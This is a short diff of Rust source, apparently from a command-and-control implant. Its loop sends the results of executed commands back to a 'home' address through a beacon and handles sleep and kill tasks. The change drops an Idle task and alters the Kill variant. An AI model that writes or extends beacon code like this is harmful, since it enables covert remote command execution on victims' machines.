@@ -30,8 +30,7 @@ pub fn run(home: SocketAddrV4) -> windows::core::Result<()> {
                 beacon.send_exec_result(result_bytes)?;
             }
             Task::Sleep(dur) => std::thread::sleep(dur),
-            Task::Kill => std::process::exit(0),
-            Task::Idle => continue,
+            Task::Kill(_) => std::process::exit(0),
         }
     }
 }
